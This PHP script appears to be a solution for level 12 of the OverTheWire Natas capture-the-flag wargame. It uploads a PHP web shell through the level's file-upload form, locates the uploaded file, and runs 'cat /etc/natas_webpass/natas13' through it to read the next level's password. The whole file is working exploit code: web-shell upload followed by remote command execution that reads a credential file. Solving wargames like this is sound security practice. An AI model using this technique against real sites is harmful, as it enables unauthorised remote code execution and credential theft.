<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 12;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('POST', $url, [
    'auth' => [$username, $password],
    'multipart' => [
        [
            'name' => 'uploadedfile',
            'contents' => file_get_contents('shell.php'),
            'filename' => 'shell.php',
        ],
        [
            'name' => 'filename',
            'contents' => 'shell.php',
        ],
    ],
]);

$body = (string)$response->getBody();
preg_match("/The file <a href=\"(.*?)\">/", $body, $shell);

$url = sprintf('http://%s.natas.labs.overthewire.org/%s', $username, $shell[1]);

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'query' => ['e' => 'cat /etc/natas_webpass/natas13']
]);

$body = (string)$response->getBody();
echo $body;
